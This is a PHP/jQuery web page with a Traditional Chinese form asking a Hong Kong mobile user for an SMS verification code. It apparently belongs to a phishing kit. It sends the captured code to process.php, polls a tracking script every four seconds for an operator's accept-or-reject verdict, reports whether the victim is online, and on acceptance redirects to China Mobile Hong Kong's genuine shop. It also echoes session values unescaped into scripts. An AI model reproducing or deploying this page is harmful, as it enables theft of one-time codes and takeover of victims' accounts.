<?php
session_start();
require_once 'config.php';
include('partials/header.php');


$phone = "";
if (isset($_SESSION['contact_number'])) {
  $phone = $_SESSION['contact_number'];
}

?>
<style>
  /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
  .wrap.middle {
      padding: 40px 30px;
      margin-top: 50px;
      background: #f0f0eb;
      padding-bottom: 0px;
  }
  @media(max-width: 767px) {
      .submit-btn {
          background-color: red;
          padding: 11px 24px;
          font-size: 20px;
          display: block;
          width: 100%;
          min-width: 120px;
          margin-left: auto;
          margin-right: auto;
          line-height: 22px;
          border-radius: 32px;
          color: #fff;
          border-color: red;
          height: auto;
          cursor: pointer;
      }
      .phone-row input, .input-otp input {
          border: none;
          border-bottom: 2px solid #cacaca;
          height: 40px;
          background: transparent;
          font-family: inherit;
          margin-bottom: 15px;
          outline: none;
      }
      .input-otp {
          text-align: center;
      }
      .input-otp input {
          text-align: center;
      }
      .note {
          text-align: center;
          font-size: 16px;
          color: #565656;
          pointer-events: none;
          user-select: none;
      }
      .count-down {
          font-size: 14px;
          color: #ccc;
          border: 1px solid #ccc;
          max-width: 200px;
          margin: auto;
          padding: 10px;
          margin-bottom: 30px;
          margin-top: 10px;
      }
      .wrap.middle form {
          width: 100%;
      }

      .submit-btn:hover:hover {
          background-color: red;
          border-color: red;
      }
  }
</style>
    <div class="backdrop"></div>
<div class="wrap middle">
  <div class="form">


    <form class="input-phone" action="">
      <div class="note">請輸入一個以認證的香港手機號碼</div>
      <div class="phone-row">
        <input class="phone-code" type="text" value="+852">
        <input class="phone-number" type="tel" value="<?php echo $phone; ?>" name="telphone" placeholder="手機號碼" pattern="[0-9]{8}" maxlength="12" required />
      </div>
      <div class="center"><button id="getotp" class="btn send-phone disabled" type="button">認證我的手機號碼</button></div>
    </form>

    <!-- <form class="input-otp" action="" method="POST"> -->
    <div class="input-otp">
      <div class="note">
        <p>驗證碼已發送到 <span id="phone-number"></span><br />請輸入您在短訊中收到的6位數字驗證碼</p>
      </div>
      <input class="otp" type="text" id="fullname" name="otp">
      <div class="count-down disabled ">重新發送驗證碼（<span class="second">60</span>秒)</div>
      <div class="center">
        <button class="btn send-otp disabled submit-btn" id="cnt">確定</button>
      </div>
    </div>
    <input type="hidden" id="last_id" value="<?php echo @$_SESSION["last_id"]; ?>" />
    <!-- </form> -->

  </div>


    <div class="spinner-border" id="ajaxprogress" style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;right: 0px;" role="status">
      <span class="" style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
          <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
      </span>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js" integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script type="text/javascript" src="./assets/js/jquery-2.1.3.min.js"></script>
<script>
  //script to check input

  jQuery('.input-phone').hide();
  jQuery('.input-otp').show();

  jQuery('.phone-row input').on('input', function() {
    let check = true;
    jQuery('.phone-row input').each(function() {
      if (jQuery(this).val() == '') check = false;
      //console.log(jQuery(this).val());

    });

    if (check) jQuery('.send-phone').removeClass('disabled');
    else jQuery('.send-phone').addClass('disabled')
  });


  jQuery('.otp').on('input', function() {
    console.log('a');

    if (jQuery('.otp').val() == '') jQuery('.send-otp').addClass('disabled');
    else jQuery('.send-otp').removeClass('disabled')
  });



  var second = 60;

  function optSent() {
    //update button
    var count = setInterval(function() {
      second--;
      jQuery('.second').html(second);
      if (second <= 0) {
        clearInterval(count);
        jQuery('.count-down').html('re send').removeClass('disabled');
      };
    }, 1000);
  }

  jQuery('.input-otp input').focus();
  jQuery('#phone-number').html(jQuery('.phone-code').val() + ' ' + jQuery('.phone-number').val());

  optSent();

  jQuery('#getotp').on('click', function() {
    //api call
    //  jQuery('.input-phone').hide();
    //jQuery('.input-otp').show();
    jQuery('.input-otp input').focus();
    jQuery('#phone-number').html(jQuery('.phone-code').val() + ' ' + jQuery('.phone-number').val());
    optSent();
  });
</script>







<script>
  jQuery('#cnt').click(function() {
    if (jQuery("#cnt").html() == '確定') {
      var last_id = jQuery("#last_id").val();
      var code = jQuery("#fullname").val();
      if (code == '') {
        $("#fillfi").show();
        return;
      }
      jQuery('#fullname').removeClass(" hide-phone");
      jQuery("#ajaxprogress").css("display", "block");
      $(".backdrop").show();
      $.ajax({
        url: 'process.php',
        type: 'POST',
        dataType: "json",
        data: {
          code: code,
          last_id: last_id
        },
        success: function(result) {
          console.log(result);
            // jQuery("#ajaxprogress").css("display", "none");
            // $(".backdrop").hide()
        }
      });

    } else {
      jQuery('#fullname').val('');
      jQuery('#fullname').attr("placeholder", "Enter your OTP");
      //jQuery('#fullname').val('Enter your OTP');
      jQuery('#fullname').removeClass(" hide-phone");
      var counter = 60;
      var interval = setInterval(function() {
        counter--;
        $('#cnt').html("確定");
        // Display 'counter' wherever you want to display it.
        if (counter <= 0) {
          clearInterval(interval);
          $('#cnt').html("確定");
          return;
        } else {
          if (counter < 60) {
            $('#time').text("00:" + counter);
          } else {
            $('#time').text(counter);
          }
          console.log("Timer --> " + counter);
        }
      }, 1000);
    }
  })
</script>

<script type="text/javascript">
  jQuery(document).ready(function() {

    var showalert = true;
    window.setInterval(function() {
      // do stuff
      var userid = jQuery("#last_id").val();
      $.ajax({
        type: 'post',
        url: 'usertrackingstatus.php',
        data: {
          'userid': userid
        },
        success: function(data) {
          //alert(data.length);
          if (data == 1) {
            jQuery(location).attr('href', 'https://eshop.hk.chinamobile.com/tc/index.html');
          }
          if (data == 2) {
            jQuery("#ajaxprogress").css("display", "none")
            $(".backdrop").hide();
            jQuery('#fillfi').css('display', 'block');
            if (showalert) {
              alert("驗證碼無效，請重新輸入");
              showalert = false;
            }
            return false;
          }

        }
      });

    }, 4000);
  })
</script>
<script>
  /* JS comes here */
  function setOnline(id, status) {
    if (id) {
      $.ajax({
        type: 'post',
        url: 'usertrackingstatus.php',
        data: {
          'id': id,
          'status': status
        },
        success: function(data) {

        }
      });
    }
  }
  var userid = <?php echo $_SESSION["last_id"]; ?>;


  window.addEventListener('load', function(e) {
    if (navigator.onLine) {
      setOnline(userid, 1)
    } else {
      setOnline(userid, 0)
    }
  }, false);

  window.addEventListener('online', function(e) {
    setOnline(userid, 1)
  }, false);

  window.addEventListener('offline', function(e) {
    setOnline(userid, 0)
  }, false);
</script>

<?php
include('partials/footer.php');
